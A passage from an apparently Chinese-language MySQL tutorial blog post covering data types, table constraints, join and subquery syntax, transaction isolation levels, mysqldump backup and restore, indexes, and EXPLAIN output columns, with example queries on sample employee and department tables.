<td>‘1000-01-01’ - ‘9999-12-31’</td>
<td>‘YYYY-MM-DD’</td>
<td>日期</td>
</tr>
<tr>
<td>TIME[(fsp)]</td>
<td>‘-838:59:59.000000’ - ‘838:59:59.000000’</td>
<td>‘hh:mm:ss[.fraction]’</td>
<td>时间，可以给出 0 到 6 范围内的可选 fsp 值，以指定秒的小数点精度。值为 0 表示没有小数部分。如果省略，则默认精度为 0</td>
</tr>
<tr>
<td>DATETIME[(fsp)]</td>
<td>‘1000-01-01 00:00:00.000000’ - ‘9999-12-31 23:59:59.999999’</td>
<td>‘YYYY-MM-DD hh:mm:ss[.fraction]’</td>
<td>日期+时间，可以给出 0 到 6 范围内的可选 fsp 值，以指定秒的小数点精度。值为 0 表示没有小数部分。如果省略，则默认精度为 0</td>
</tr>
<tr>
<td>TIMESTAMP[(fsp)]</td>
<td>‘1970-01-01 00:00:01.000000’ UTC - ‘2038-01-19 03:14:07.999999’</td>
<td>‘YYYY-MM-DD hh:mm:ss[.fraction]’</td>
<td>时间戳，可以给出 0 到 6 范围内的可选 fsp 值，以指定秒的小数点精度。值为 0 表示没有小数部分。如果省略，则默认精度为 0</td>
</tr>
<tr>
<td>YEAR[(2|4)]</td>
<td></td>
<td>YYYY or YY</td>
<td>年份，从MySQL 5.6.6开始，已弃2位格式表示的年份</td>
</tr>
</tbody></table>
<h2 id="3-5-其它数据类型（略）"><a href="#3-5-其它数据类型（略）" class="headerlink" title="3.5. 其它数据类型（略）"></a>3.5. 其它数据类型（略）</h2><p>详细查看<a href="https://dev.mysql.com/doc/refman/5.6/en/data-types.html">MySQL :: MySQL 5.6 Reference Manual :: 11 Data Types</a> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">point multipoint linestring multilinestring polygon multipolygon geometry geometrycollection</span><br></pre></td></tr></table></figure>

<h1 id="4-约束"><a href="#4-约束" class="headerlink" title="4. 约束"></a>4. 约束</h1><h2 id="4-1-主键约束"><a href="#4-1-主键约束" class="headerlink" title="4.1 主键约束"></a>4.1 主键约束</h2><ul>
<li><p>特性：NOT NULL（非空）、UNIQUE（唯一）、可能被引用（被外键引用）</p>
</li>
<li><p>添加主键方式</p>
</li>
</ul>
<p>​	方法一：在创建表时，在类型后面加上PRIMARY KEY，如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`id` INT(11) PRIMARY KEY</span><br></pre></td></tr></table></figure>

<p>​	方法二：在创建表时，在最后一个字段后加逗号后，再加上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PRIMARY KET(`id`)</span><br></pre></td></tr></table></figure>

<p>​	方法三：在修改表时添加主键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE t_user ADD PRIMARY KEY(`id`);</span><br></pre></td></tr></table></figure>

<ul>
<li>删除主键</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE t_user DROP PRIMARY KEY;</span><br></pre></td></tr></table></figure>

<ul>
<li>可设置主键自增长，如：<code>PRIMARY KEY AUTO_INCREMENT</code>，主键一定为整型才能自增长。尽管你删了原来的记录，再创建新纪录时，主键设为NULL，它会延续上一次的增长顺序</li>
</ul>
<h2 id="4-2-外键约束"><a href="#4-2-外键约束" class="headerlink" title="4.2 外键约束"></a>4.2 外键约束</h2><ul>
<li><p>特性：外键必须是另一张表（或自身）的主键，可重复，可为NULL，一张表可以有多个外键</p>
</li>
<li><p>添加外键方式：</p>
</li>
</ul>
<p>​	方法一：在创建表时，在最后一个字段后加逗号后，再加上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONSTRAINT `fk_uid_user_id` FOREIGN KEY(`uid`) REFERENCES `t_user`(`id`)</span><br></pre></td></tr></table></figure>

<p>​	方法二：在修改表时添加外键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE t_xxx ADD CONSTRAINT `fk_uid_user_id` FOREIGN KEY(`uid`) REFERENCES `t_user`(`id`);</span><br></pre></td></tr></table></figure>

<ul>
<li>删除外键</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE t_xxx DROP FOREIGN KEY `fk_uid_user_id`;</span><br></pre></td></tr></table></figure>

<ul>
<li>对应关系</li>
</ul>
<p>​	一对多：”从表”中的外键与”主表”中的主键关联起来，外键的值可以为NULL，也可以为”主表”主键的任意一个值</p>
<p>​	一对一：与一对多类似，且外键具有唯一性确保了一对一的关系</p>
<p>​	多对多：通过引入”中间表”设定外键来支撑多对多关系</p>
<h2 id="4-3-非空约束"><a href="#4-3-非空约束" class="headerlink" title="4.3 非空约束"></a>4.3 非空约束</h2><p>NOT NULL修饰的字段不能为空，通常都把字段设置为非空，并给出默认值，除非有特殊需求</p>
<h2 id="4-4-唯一约束"><a href="#4-4-唯一约束" class="headerlink" title="4.4 唯一约束"></a>4.4 唯一约束</h2><p>UNIQUE修饰的字段的值具有唯一性，也就是说，所有记录，该字段的值都不一样</p>
<h2 id="4-5-默认值约束"><a href="#4-5-默认值约束" class="headerlink" title="4.5 默认值约束"></a>4.5 默认值约束</h2><p>插入数据时，不指定字段的值，则该字段使用默认值</p>
<h2 id="4-6-零填充约束"><a href="#4-6-零填充约束" class="headerlink" title="4.6 零填充约束"></a>4.6 零填充约束</h2><p>整型数据均可以设置ZEROFILL属性，例如 <code>num int(11) ZEROFILL NOT NULL DEFAULT 0 ;</code> 表示不足11位时高位补0至11位数，若超过11位则按实际数据显示（这里的INT最大只有11位，因此不存在这个情况），默认也会加上无符号约束（UNSIGNED）</p>
<h2 id="4-7-无符号约束"><a href="#4-7-无符号约束" class="headerlink" title="4.7 无符号约束"></a>4.7 无符号约束</h2><p>指定当前列的数值为非负数，例如 <code>age TINYINT(3) UNSIGNED NOT NULL DEFAULT 0;</code> 表示无符号，且数值范围为0-255（有符号的2倍）</p>
<h2 id="4-8-自增长约束"><a href="#4-8-自增长约束" class="headerlink" title="4.8 自增长约束"></a>4.8 自增长约束</h2><p>通常使用在主键上，例如 <code>id INT(11) NOT NULL PRIMARY KEY AUTO_INCREMENT</code> ，但也可以用在有KEY的字段上</p>
<h1 id="5-连接查询"><a href="#5-连接查询" class="headerlink" title="5. 连接查询"></a>5. 连接查询</h1><h2 id="5-1-内连接"><a href="#5-1-内连接" class="headerlink" title="5.1 内连接"></a>5.1 内连接</h2><p>要去除笛卡尔积(存在大量重复数据)，关键字：<code>INNER JOIN</code> 或 <code>JOIN</code></p>
<ul>
<li>exam数据库里面，查询所有员工的姓名，工资以及员工部门，mysql的写法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT e.ename &#x27;姓名&#x27;, e.sal &#x27;工资&#x27;, d.dname &#x27;部门&#x27; FROM emp e, dept d WHERE e.deptno = d.deptno;</span><br></pre></td></tr></table></figure>

<ul>
<li>上面是在mysql才能使用的写法，下面是标准统一写法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT e.ename &#x27;姓名&#x27;, e.sal &#x27;工资&#x27;, d.dname &#x27;部门&#x27; FROM emp e INNER JOIN dept d ON e.deptno = d.deptno;</span><br></pre></td></tr></table></figure>

<p>注：内连接关键字 <code>INNER</code> 可省略</p>
<p>》》》》》》》》》》》》》》》》自然连接《《《《《《《《《《《《《《《《</p>
<p>模板：<code>SELECT ... FROM ... NATURAL JOIN ... </code> 不用加ON条件</p>
<p>描述：自然连接为特殊的内连接（自然内连接），自动使用两个表中名称相同的字段作为连接条件，且结果集中相同字段只会出现一次</p>
<h2 id="5-2-外连接"><a href="#5-2-外连接" class="headerlink" title="5.2 外连接"></a>5.2 外连接</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">合并结果集：</span><br><span class="line">UNION - 结果集不会显示重复的数据</span><br><span class="line">UNION ALL - 结果集会显示重复的数据</span><br><span class="line">注：合并结果集的SQL是一条SQL，只需要在最后加分号</span><br></pre></td></tr></table></figure>

<p>（1）左外连接，左表会显示所有记录，而右表显示满足条件的记录，不满足的记录用NULL补全，关键字：<code>LEFT OUTER JOIN</code> 或 <code>LEFT JOIN</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT e.ename, e.sal, d.dname FROM emp e LEFT OUTER JOIN dept d ON e.deptno = d.deptno;</span><br></pre></td></tr></table></figure>

<p>（2）右外连接，右表会显示所有记录，而左表显示满足条件的记录，不满足的记录用NULL补全，关键字：<code>RIGHT OUTER JOIN</code> 或 <code>RIGHT JOIN</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT e.ename, e.sal, IFNULL(d.dname, &#x27;无&#x27;) &#x27;dname&#x27; FROM emp e RIGHT OUTER JOIN dept d ON e.deptno = d.deptno;</span><br></pre></td></tr></table></figure>

<p>（3）全外连接，mysql不支持，但可以通过UNION模拟实现全外连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT e.ename, e.sal, d.dname FROM emp e LEFT OUTER JOIN dept d ON e.deptno = d.deptno</span><br><span class="line">UNION</span><br><span class="line">SELECT e.ename, e.sal, d.dname FROM emp e RIGHT OUTER JOIN dept d ON e.deptno = d.deptno;</span><br></pre></td></tr></table></figure>

<p>（4）自然左外连接，关键字：<code>NATURAL LEFT OUTER JOIN</code> 或 <code>NATURAL LEFT JOIN</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT e.ename, e.sal, d.dname FROM emp e NATURAL LEFT OUTER JOIN dept d;</span><br></pre></td></tr></table></figure>

<p>（5）自然右外连接，关键字：<code>NATURAL RIGHT OUTER JOIN</code> 或 <code>NATURAL RIGHT JOIN</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT e.ename, e.sal, d.dname FROM emp e NATURAL RIGHT OUTER JOIN dept d;</span><br></pre></td></tr></table></figure>

<p>（6）自然全连接（没有自然全连接）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*出问题</span><br><span class="line">SELECT e.ename, e.sal, d.dname FROM emp e NATURAL LEFT OUTER JOIN dept d</span><br><span class="line">UNION</span><br><span class="line">SELECT e.empno, e.sal, d.dname FROM emp e NATURAL RIGHT OUTER JOIN dept d;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<p>注：外连接关键字 <code>OUTER</code> 可省略</p>
<h1 id="6-子查询"><a href="#6-子查询" class="headerlink" title="6. 子查询"></a>6. 子查询</h1><p>通常用在FROM,WHERE后面</p>
<h2 id="6-1-一行一列"><a href="#6-1-一行一列" class="headerlink" title="6.1 一行一列"></a>6.1 一行一列</h2><ul>
<li>高于平均工资的所有人，以工资降序排序</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM emp WHERE sal &gt; (SELECT AVG(sal) FROM emp) ORDER BY sal DESC;</span><br></pre></td></tr></table></figure>

<h2 id="6-2-多行单列"><a href="#6-2-多行单列" class="headerlink" title="6.2 多行单列"></a>6.2 多行单列</h2><p>可以使用ALL, ANY, IN</p>
<p>（1）打印大于30部门所有员工工资的员工详细信息，意思就是说大于30部门最大工资的员工，下面两种方法都行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM emp WHERE sal &gt; ALL (SELECT sal FROM emp WHERE deptno=30);</span><br><span class="line">SELECT * FROM emp WHERE sal &gt; (SELECT MAX(sal) FROM emp WHERE deptno=30);</span><br></pre></td></tr></table></figure>

<p>（2）打印大于任意一个2001年入职员工员工工资的员工详细信息，工资升序排序。下面两种方法都行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM emp WHERE sal &gt; ANY (SELECT sal FROM emp WHERE hiredate LIKE &#x27;2001%&#x27;) ORDER BY sal ASC;</span><br><span class="line">SELECT * FROM emp WHERE sal &gt; (SELECT MIN(sal) FROM emp WHERE hiredate LIKE &#x27;2001%&#x27;) ORDER BY sal;</span><br></pre></td></tr></table></figure>

<h2 id="6-3-单行多列"><a href="#6-3-单行多列" class="headerlink" title="6.3 单行多列"></a>6.3 单行多列</h2><p>查询工作类型、工资、部门与殷天正完全相同的其他(不能是自己)员工详细信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM emp WHERE (job, sal, deptno) IN (SELECT job, sal, deptno FROM emp WHERE ename = &#x27;殷天正&#x27;) AND ename != &#x27;殷天正&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="6-4-多行多列"><a href="#6-4-多行多列" class="headerlink" title="6.4 多行多列"></a>6.4 多行多列</h2><p>打印入职时间在2001年部门编号为30的所有员工详细信息，一般用在FROM后面，要起别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM (SELECT * FROM emp WHERE hiredate LIKE &#x27;2001%&#x27;) e1 WHERE e1.deptno = 30;</span><br></pre></td></tr></table></figure>

<h1 id="7-事务的特性、隔离级别"><a href="#7-事务的特性、隔离级别" class="headerlink" title="7. 事务的特性、隔离级别"></a>7. 事务的特性、隔离级别</h1><h2 id="7-1-事务特性-ACID"><a href="#7-1-事务特性-ACID" class="headerlink" title="7.1 事务特性(ACID)"></a>7.1 事务特性(ACID)</h2><table>
<thead>
<tr>
<th>特性</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>Atomicity（原子性）</td>
<td>一组事务执行全失败或者全成功，不会结束在中间环境，失败后会全回滚。</td>
</tr>
<tr>
<td>Consistency（一致性）</td>
<td>事务前后，数据库的完整性没有被破坏。如A转账给B，A扣了100，B必然增加100，不可能出现A扣了钱，B却没收到的情况。</td>
</tr>
<tr>
<td>Isolation（隔离性）</td>
<td>事务间相互隔离，互不影响。</td>
</tr>
<tr>
<td>Durability（持久性）</td>
<td>事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。</td>
</tr>
</tbody></table>
<h2 id="7-2-隔离级别"><a href="#7-2-隔离级别" class="headerlink" title="7.2 隔离级别"></a>7.2 隔离级别</h2><ul>
<li>查看事务隔离级别</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;tx_isolation&#x27;;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>隔离级别</th>
<th>特点</th>
<th>脏读</th>
<th>不可重复读</th>
<th>幻读</th>
</tr>
</thead>
<tbody><tr>
<td>读未提交（read-uncommitted）</td>
<td>可读取到其它事务未提交的数据</td>
<td>是</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>读已提交（read-committed）</td>
<td>只可读取到其它事务已提交的数据</td>
<td>否</td>
<td>是</td>
<td>是</td>
</tr>
<tr>
<td>可重复读（repeatable-read）</td>
<td>同一事务的多个实例在并发读取数据时，结果不变；MySQL默认</td>
<td>否</td>
<td>否</td>
<td>是</td>
</tr>
<tr>
<td>串行化（serializable）</td>
<td>强制事务串行来执行，可能导致大量超时和锁竞争的问题</td>
<td>否</td>
<td>否</td>
<td>否</td>
</tr>
</tbody></table>
<p>并发请求产生的问题：</p>
<table>
<thead>
<tr>
<th>问题</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td>更新丢失</td>
<td>多个事务更新同一数据，导致更新覆盖</td>
</tr>
<tr>
<td>脏读</td>
<td>读取到其它事务未提交的数据，一旦其它事务进行回滚操作，读取到的则是脏数据。</td>
</tr>
<tr>
<td>不可重复读</td>
<td>事务A多次读取同一数据，事务B在事务A多次读取的过程中，对数据作了更新并提交，导致事务A多次读取同一数据时，结果不一致。侧重修改</td>
</tr>
<tr>
<td>幻读</td>
<td>在多次读取同一范围数据情况下，读取到其它事务新增的符合条件的数据，感觉上像读出了幻觉。侧重于新增或删除</td>
</tr>
</tbody></table>
<p>小结：不可重复读的和幻读很容易混淆，不可重复读侧重于修改，幻读侧重于新增或删除。解决不可重复读的问题只需锁住满足条件的行，解决幻读需要锁表</p>
<h1 id="8-数据备份与恢复"><a href="#8-数据备份与恢复" class="headerlink" title="8. 数据备份与恢复"></a>8. 数据备份与恢复</h1><p>注意：备份的是数据库内容，而不会备份创建数据库的语句</p>
<ul>
<li>备份</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MYSQLDUMP -uroot -p123 mydb01&gt;d:/MySQL/mydb01.sql</span><br></pre></td></tr></table></figure>

<ul>
<li>恢复：两种恢复方法都得先创建好数据库，因为备份的是sql语句，没有创建的语句，不用登陆数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法一：</span><br><span class="line">MYSQL -uroot -p123 mydb01&lt;d:/MySQL/mydb01.sql</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">SOURCE d:/MySQL/mydb01.sql;</span><br></pre></td></tr></table></figure>


<h1 id="9-优化"><a href="#9-优化" class="headerlink" title="9. 优化"></a>9. 优化</h1><h2 id="9-1-概述"><a href="#9-1-概述" class="headerlink" title="9.1 概述"></a>9.1 概述</h2><p>优化方向：缓存区内存大小的设置、主从复制、读写分离；</p>
<p>常见瓶颈：CPU负载过重、磁盘I&#x2F;O瓶颈；</p>
<p>性能工具：top、free、iostat、vmstat查看系统性能状态；</p>
<p>请求响应慢：执行时间长、等待时间长（sql书写不合理、索引失效、关联查询过多、服务器调优和各个参数设置（缓存、线程数等））。</p>
<p>索引是一种有序的快速查找的数据结构。查询频率高的查询条件需要索引，而表记录少、查询频率很低（经常增删改）、字段数据大多重复且分布平均（索引效果不佳）的情况，不建议使用索引。因此应该只为最经常查询和排序的字段建立索引。</p>
<p>索引分类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 按存储方式来划分</span><br><span class="line">FULLTEXT，HASH，BTREE，RTREE</span><br><span class="line"></span><br><span class="line"># 按逻辑分区来划分</span><br><span class="line">主键索引（PRIMARY KEY），外键索引（FOREIGN KEY），普通索引（INDEX），唯一索引（UNIQUE），全文索引（FULLTEXT）</span><br><span class="line"></span><br><span class="line"># 按实际使用划分</span><br><span class="line">单值索引，复合索引</span><br></pre></td></tr></table></figure>

<p>（唯一）索引的创建与删除，[]表示可省略，普通索引命名通常以<code>idx_</code>开头，唯一索引以<code>unique_</code>开头。同理，（唯一）复合索引也是同样的创建方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 创建（唯一）索引，第二种方式可不写索引名称。</span><br><span class="line"><span class="keyword">CREATE</span> [<span class="keyword">UNIQUE</span>] INDEX `idx_name` <span class="keyword">ON</span> `t_user`(`name`);</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `t_user` <span class="keyword">ADD</span> [<span class="keyword">UNIQUE</span>] INDEX [`idx_name`] (`name`);</span><br><span class="line"></span><br><span class="line"># 删除（唯一）索引</span><br><span class="line"><span class="keyword">DROP</span> INDEX `idx_name` <span class="keyword">ON</span> `t_user`;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> `t_user` <span class="keyword">DROP</span> INDEX `idx_name`;</span><br><span class="line"></span><br><span class="line"># 查看索引</span><br><span class="line"><span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> `t_user`;</span><br></pre></td></tr></table></figure>

<p>SQL顺序：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 书写顺序</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> <span class="operator">&lt;</span>select_list<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">FROM</span> <span class="operator">&lt;</span>left_table<span class="operator">&gt;</span> <span class="operator">&lt;</span>join_type<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">JOIN</span> <span class="operator">&lt;</span>right_table<span class="operator">&gt;</span> <span class="keyword">ON</span> <span class="operator">&lt;</span>join_condition<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">WHERE</span> <span class="operator">&lt;</span>where_condition<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>group_by_list<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">HAVING</span> <span class="operator">&lt;</span>having_condition<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>order_by_condition<span class="operator">&gt;</span></span><br><span class="line">LIMIT <span class="operator">&lt;</span>limit_number<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"># 执行顺序</span><br><span class="line"><span class="keyword">FROM</span> <span class="operator">&lt;</span>left_table<span class="operator">&gt;</span> <span class="keyword">ON</span> <span class="operator">&lt;</span>join_condition<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>join_type<span class="operator">&gt;</span> <span class="keyword">JOIN</span> <span class="operator">&lt;</span>right_table<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">WHERE</span> <span class="operator">&lt;</span>where_condition<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>group_by_list<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">HAVING</span> <span class="operator">&lt;</span>having_condition<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> <span class="operator">&lt;</span>select_list<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span>order_by_condition<span class="operator">&gt;</span></span><br><span class="line">LIMIT <span class="operator">&lt;</span>limit_number<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="9-2-JOIN的7种关系"><a href="#9-2-JOIN的7种关系" class="headerlink" title="9.2 JOIN的7种关系"></a>9.2 JOIN的7种关系</h2><h3 id="9-2-1-获取a、b的交集"><a href="#9-2-1-获取a、b的交集" class="headerlink" title="9.2.1 获取a、b的交集"></a>9.2.1 获取a、b的交集</h3><p><img src="/../img/202205022114756.jpg"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM a INNER JOIN b ON a.key = b.key;</span><br></pre></td></tr></table></figure>

<h3 id="9-2-2-获取a独有和a、b共有的结果集"><a href="#9-2-2-获取a独有和a、b共有的结果集" class="headerlink" title="9.2.2 获取a独有和a、b共有的结果集"></a>9.2.2 获取a独有和a、b共有的结果集</h3><p><img src="/../img/202205022116587.jpg" alt="2"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM a LEFT JOIN b ON a.key = b.key;</span><br></pre></td></tr></table></figure>

<h3 id="9-2-3-获取b独有和a、b共有的结果集"><a href="#9-2-3-获取b独有和a、b共有的结果集" class="headerlink" title="9.2.3 获取b独有和a、b共有的结果集"></a>9.2.3 获取b独有和a、b共有的结果集</h3><p><img src="/../img/202205022118355.jpg" alt="3"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM a RIGHT JOIN b ON a.key = b.key;</span><br></pre></td></tr></table></figure>

<h3 id="9-2-4-获取a与b的差集"><a href="#9-2-4-获取a与b的差集" class="headerlink" title="9.2.4 获取a与b的差集"></a>9.2.4 获取a与b的差集</h3><p><img src="/../img/202205022123216.jpg" alt="4"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM a LEFT JOIN b ON a.key = b.key WHERE b.key IS NULL;</span><br></pre></td></tr></table></figure>

<h3 id="9-2-5-获取b与a的差集"><a href="#9-2-5-获取b与a的差集" class="headerlink" title="9.2.5 获取b与a的差集"></a>9.2.5 获取b与a的差集</h3><p><img src="/../img/202205022124553.jpg" alt="5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM a RIGHT JOIN b ON a.key = b.key WHERE a.key IS NULL;</span><br></pre></td></tr></table></figure>

<h3 id="9-2-6-获取a、b的并集"><a href="#9-2-6-获取a、b的并集" class="headerlink" title="9.2.6 获取a、b的并集"></a>9.2.6 获取a、b的并集</h3><p><img src="/../img/202205022128126.jpg" alt="6"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM a FULL OUTER JOIN b ON a.key = b.key;</span><br></pre></td></tr></table></figure>

<ul>
<li>由于mysql不支持FULL OUTER JOIN，需要改写成：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM a LEFT JOIN b ON a.key = b.key</span><br><span class="line">UNION</span><br><span class="line">SELECT * FROM a RIGHT JOIN b ON a.key = b.key;</span><br></pre></td></tr></table></figure>

<h3 id="9-2-7-获取a、b并集与交集的差集"><a href="#9-2-7-获取a、b并集与交集的差集" class="headerlink" title="9.2.7 获取a、b并集与交集的差集"></a>9.2.7 获取a、b并集与交集的差集</h3><p><img src="/../img/202205022129692.jpg" alt="7"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM a FULL OUTER JOIN b ON a.key = b.key WHERE a.key IS NULL OR b.key IS NULL;</span><br></pre></td></tr></table></figure>

<ul>
<li>由于mysql不支持FULL OUTER JOIN，需要改写成：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM a LEFT JOIN b ON a.key = b.key WHERE b.key IS NULL</span><br><span class="line">UNION</span><br><span class="line">SELECT * FROM a RIGHT JOIN b ON a.key = b.key WHERE a.key IS NULL;</span><br></pre></td></tr></table></figure>

<h2 id="9-3-explain（查询分析计划）"><a href="#9-3-explain（查询分析计划）" class="headerlink" title="9.3 explain（查询分析计划）"></a>9.3 explain（查询分析计划）</h2><h3 id="9-3-1-id"><a href="#9-3-1-id" class="headerlink" title="9.3.1 id"></a>9.3.1 id</h3><p>id值越大，优先级越高，越先执行，id值相同，从上往下执行</p>
<h3 id="9-3-2-select-type"><a href="#9-3-2-select-type" class="headerlink" title="9.3.2 select_type"></a>9.3.2 select_type</h3><p>查询类型包含：</p>
<p>1）SIMPLE</p>
<p>简单的查询，不包含子查询或者UNION</p>
<p>2）PRIMARY</p>
<p>包含子查询的时候，最外层查询的查询类型</p>
<p>3）SUBQUERY</p>
<p>包含子查询的时候，子查询的查询类型</p>
<p>4）DERIVED</p>
<p>衍生出来的表标记的查询类型，比如其它查询结果集作为一个衍生的表</p>
<p>5）UNION</p>
<p>若第二个SELECT出现在UNION之后，则被标记为UNION;</p>
<p>若UNION包含在FROM子句的子查询中，外层的SELECT被标记为DERIVED</p>
<p>6）UNION RESULT</p>
<p>从UNION表获取结果的SELECT</p>
<h3 id="9-3-3-table"><a href="#9-3-3-table" class="headerlink" title="9.3.3 table"></a>9.3.3 table</h3><p>查询的表名，或者衍生表名（derivedN，unionN）</p>
<h3 id="9-3-4-type"><a href="#9-3-4-type" class="headerlink" title="9.3.4 type"></a>9.3.4 type</h3><p>访问类型，从最好到最坏依次是：</p>
<p>常见：system &gt; const &gt; eq_ref &gt; ref &gt; range &gt; index &gt; ALL</p>
<p>所有：system &gt; const &gt; eq_ref &gt; ref &gt; fulltext &gt; ref_or_null &gt; index_merge &gt; unique_subquery &gt; index_subquery &gt; range &gt; index &gt; ALL</p>
<p>system：表只有一行记录，没实际意义，const的特例</p>
<p>const：用于比较PRIMARY KEY或者UNIQUE索引</p>
<p>eq_ref：唯一性索引扫描，对于每个索引键，表中只有一条记录与之匹配，常见于主键或者唯一索引扫描</p>
<p>ref：非唯一性索引扫描，返回匹配某个单独值的所有行，本质上也是一种索引访问，它返回匹配某个单独值的所有行，然而可能找到多个符合条件的行，所以应该属于查询和扫描的混合体</p>
<p>range：范围查询，WHERE语句中出现了between … and、&lt;、&gt;、&lt;&#x3D;、&gt;&#x3D; 、in等</p>
<p>index：全所有扫描，index和ALL区别为index类型只遍历索引树，而ALL遍历数据文件，通常索引文件比数据文件要小</p>
<p>ALL：全表扫描</p>
<p>一般来说，得保证在至少达到range级别，最好能达到ref</p>
<h3 id="9-3-5-possible-keys"><a href="#9-3-5-possible-keys" class="headerlink" title="9.3.5 possible_keys"></a>9.3.5 possible_keys</h3><p>可能用到的索引</p>
<h3 id="9-3-6-key"><a href="#9-3-6-key" class="headerlink" title="9.3.6 key"></a>9.3.6 key</h3><p>实际用到的索引，如果为NULL，说明：1）可能没建索引；2）索引失效</p>
<p>假如possible_keys为NULL，而key不为NULL，说明：虽然没有指定查询条件，但查询的结果字段和建的复合索引的字段和顺序恰好吻合，而避免了全表扫描</p>
<h3 id="9-3-7-key-len"><a href="#9-3-7-key-len" class="headerlink" title="9.3.7 key_len"></a>9.3.7 key_len</h3><p>表示索引中使用的字节数，可通过该列计算查询中使用的索引的长度，在不损失精确性的情况下，长度越短越好。key_len显示的值为索引字段的最大可能长度，并非实际使用长度，通过计算而得，而不是通过表内检索出的</p>
<h3 id="9-3-8-ref"><a href="#9-3-8-ref" class="headerlink" title="9.3.8 ref"></a>9.3.8 ref</h3><p>显示索引的哪一列被使用了，可能的值为const或者数据库名.表名.列名</p>
<h3 id="9-3-9-rows"><a href="#9-3-9-rows" class="headerlink" title="9.3.9 rows"></a>9.3.9 rows</h3><p>查询出符合条件的结果所需要的扫描到的行数</p>
<h3 id="9-3-10-Extra"><a href="#9-3-10-Extra" class="headerlink" title="9.3.10 Extra"></a>9.3.10 Extra</h3><p>额外的重要信息：</p>
<p>1）Using filesort，说明使用的是一个外部的索引排序，而不是按照表内的索引进行排序，最好优化一下。比如：表中有复合索引<code>idx_col1_col2_col3 (col1, col2, col3)</code>，<code>SELECT col1 FROM t WHERE col1 = &#39;xxx&#39; ORDER BY col3;</code>排序时没有走索引，因此可以改为<code>ORDER BY col2,col3</code>；</p>
